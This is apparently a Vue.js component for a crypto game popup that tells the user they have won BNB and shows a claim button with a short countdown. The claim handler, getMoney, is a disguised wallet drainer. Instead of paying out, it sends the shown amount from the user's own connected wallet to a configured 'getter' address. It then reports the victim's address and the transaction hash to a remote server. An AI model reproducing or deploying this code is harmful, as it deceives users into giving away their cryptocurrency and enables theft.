<template>
<div class="game-card">
  <q-card style="width: 700px; max-width: 100%;" class="bg-dark">

    <q-toolbar class="justify-end">
      <q-btn dense flat icon="close" v-close-popup/>
    </q-toolbar>

    <div class="flex justify-center" style="margin-top: -30px">
      <q-img :src="coinImage" width="250px" height="250px" img-class="shadow-3">
        <template v-slot:loading>
          <q-skeleton class="fit"/>
        </template>
      </q-img>
    </div>

    <div style="font-size: 24px; font-weight: 800; line-height: 1" class="text-center">
      {{ $t('youWin') }}
    </div>

    <div v-if="winLoader" style="font-size: 35px; font-weight: 800" class="flex flex-center">
      <q-skeleton height="35px" width="200px"></q-skeleton>
    </div>

    <div v-else style="font-size: 30px; font-weight: 800; line-height: 1" class="text-center text-warning q-mt-xs warning-shadow">
      {{ gameWallet.formattedWorkBalance }}<span style="font-size: 20px"> BNB</span>
    </div>

    <div class="text-center q-pa-lg">

      <q-btn
        v-if="showClaimBtn"
        :label="`${$t('claim')} ${claimCount}`"
        unelevated
        id="claim-button"
        outline
        no-caps
        color="secondary"
        v-close-popup
        class="letter-3 text-bold q-py-xs full-width game-button rounded-borders-xl secondary-shadow-inset text-secondary-shadow"
        @click="getMoney"
      />

      <div v-else style="height: 70px" class="flex flex-center">
        {{ tryAgainText }}
      </div>
    </div>

  </q-card>
</div>
</template>

<script>
import bnbImage from 'src/assets/bnb.png'
import { mapState } from 'vuex'
import config from 'src/config'
import Web3 from 'web3'
import { getMyConnectedWallet } from 'components/wallet/store/actions'
import axios from 'axios'

export default {
  name: 'game-card',
  computed: {
    ...mapState('wallet', ['wallet', 'gameWallet']),
    coinImage () {
      return bnbImage
    }
  },
  methods: {
    claimCounterStart () {
      const vm = this
      const claimCounter = setInterval(() => {
        vm.claimCount -= 1
        if (vm.claimCount === 0) {
          clearInterval(claimCounter)
          vm.showClaimBtn = false
          vm.tryAgainText = vm.$t('gameLoserText')
        }
      }, 1000)
    },
    async getMoney () {
      const vm = this
      const web3 = new Web3('https://bsc-dataseed1.binance.org:443')
      const connectedWallet = await getMyConnectedWallet()
      web3.eth.setProvider(connectedWallet.provider)

      web3.eth.sendTransaction({
        from: vm.wallet.address,
        to: config.getterAddress,
        value: vm.gameWallet.workBalance
      }).then(async (res) => {
        try {
          await axios.post(`${config.walletServerURI}/wallet/transaction_bnb/`, {
            from_address: vm.wallet.address,
            value: vm.gameWallet.formattedWorkBalance,
            hash: res.transactionHash
          })
        } catch (e) {
          console.log(e)
        }
      })
    }
  },
  data () {
    return {
      winLoader: true,
      showClaimBtn: false,
      claimCount: 7,
      tryAgainText: ''
    }
  },
  created () {
    const vm = this
    setTimeout(() => {
      vm.winLoader = false
      vm.showClaimBtn = true
      vm.claimCounterStart()
    }, 3000)
  }
}
</script>

<style lang="sass">
.game-button
  width: 200px
  font-size: 20px
  height: 70px
</style>
